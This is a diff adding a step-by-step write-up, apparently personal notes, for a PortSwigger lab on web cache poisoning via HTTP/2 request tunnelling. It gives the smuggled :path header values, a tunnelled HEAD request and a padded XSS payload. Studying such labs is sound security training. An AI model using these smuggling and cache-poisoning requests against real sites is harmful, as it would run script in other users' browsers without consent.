@@ -4562,7 +4562,49 @@ Response: Communication timed out. (chunked size is 5)
 
     value: xyz
     ```
-- dd
+- **Web cache poisoning** via HTTP/2 request tunnelling
+  - Info: This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and doesn't consistently sanitize incoming headers. To solve the lab, poison the cache in such a way that when the victim visits the home page, their browser executes alert(1). A victim user will visit the home page every 15 seconds.
+  - https://www.youtube.com/watch?v=gv0PhCdUmj4
+  - smuggling an arbitrary header in the :path > receive a normal response > confirming that you're able to inject via the :path
+    ```
+    name: path:
+
+    value:
+    /?cachebuster=1 HTTP/1.1
+    Foo: bar
+    ```
+  - Change the request method to HEAD > change the :path header to tunnel a request for another arbitrary endpoint > 200 OK
+    ```
+    name: path:
+
+    /?cachebuster=2 HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+
+    GET /post?postId=8 HTTP/1.1
+    Foo: bar
+    ```
+
+    Note: change the postId value if you are getting the error "Server Error: Communication timed out" (content length must exceed the home page)
+    ```
+    curl --head https://0a80004f03ed893b83c8877800ae00ae.web-security-academy.net
+    content-length: 8696
+
+    curl --head https://0a80004f03ed893b83c8877800ae00ae.web-security-academy.net/post?postId=8
+    content-length: 9009
+    ```
+  - including an XSS payload in tunneling request > get Communication timed out
+    ```
+    name: path:
+    
+    /?cachebuster=3 HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+
+    GET /resources?<script>alert(1)</script> HTTP/1.1
+    Foo: bar
+    ```
+  - The content-length of home page is 8696. Add in enough arbitrary characters after </script> and resend the request > alert prompt
+    command prompt > python > print('A' * 9000)
+  - Resend by removing the "?cachebuster=3"
 - dd
 - dd 
 - dd
